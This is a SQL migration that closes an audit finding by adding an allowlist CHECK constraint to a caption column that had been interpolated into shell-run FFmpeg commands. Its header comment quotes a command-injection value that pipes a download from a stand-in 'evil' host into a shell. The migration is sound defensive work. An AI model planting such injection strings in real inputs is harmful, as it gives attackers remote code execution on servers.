-- ═══════════════════════════════════════════════════════════════════════════
-- Migration 031 — Sanitize scenes.caption_highlight_word
-- Closes finding H-4 from docs/SECURITY_AUDIT_2026_04_21.md
-- ═══════════════════════════════════════════════════════════════════════════
--
-- Context: `caption_highlight_word` is written by the 3-pass script generator
-- (Pass 2) and has historically been interpolated into shell-executed FFmpeg
-- `docker exec … sh -c "ffmpeg …"` command lines. Combined with the (now
-- fixed) RLS hole in C-2, an anonymous attacker could PATCH this column to
-- `foo"; curl evil | sh; #` and get RCE on the VPS once the caption-burn
-- service picked up the scene.
--
-- This migration enforces data-layer defense-in-depth:
--   * NULL allowed (many scenes have no highlight word)
--   * ≤ 40 chars
--   * Only ASCII letters, digits, spaces, hyphen, apostrophe
--     (enough for real English/proper-noun highlights; no shell metas,
--      no backtick, no $(), no ;|&<>\"'` chars)
-- Any existing non-conforming row is NORMALISED to NULL before the CHECK
-- is applied so the ALTER succeeds without rollback.
--
-- Rollback:
--   ALTER TABLE public.scenes DROP CONSTRAINT scenes_caption_highlight_word_safe;

BEGIN;

-- 1. Normalise existing offenders to NULL (audit logs what we touched).
DO $$
DECLARE
  offenders integer;
BEGIN
  SELECT count(*) INTO offenders
  FROM public.scenes
  WHERE caption_highlight_word IS NOT NULL
    AND (
      char_length(caption_highlight_word) > 40
      OR caption_highlight_word !~ '^[A-Za-z0-9 ''-]+$'
    );
  IF offenders > 0 THEN
    RAISE NOTICE 'migration 031: normalising % offending caption_highlight_word row(s) to NULL', offenders;
    UPDATE public.scenes
       SET caption_highlight_word = NULL
     WHERE caption_highlight_word IS NOT NULL
       AND (
         char_length(caption_highlight_word) > 40
         OR caption_highlight_word !~ '^[A-Za-z0-9 ''-]+$'
       );
  END IF;
END $$;

-- 2. Defense-in-depth CHECK constraint.
ALTER TABLE public.scenes
  ADD CONSTRAINT scenes_caption_highlight_word_safe
  CHECK (
    caption_highlight_word IS NULL
    OR (
      char_length(caption_highlight_word) <= 40
      AND caption_highlight_word ~ '^[A-Za-z0-9 ''\-]+$'
    )
  );

COMMIT;
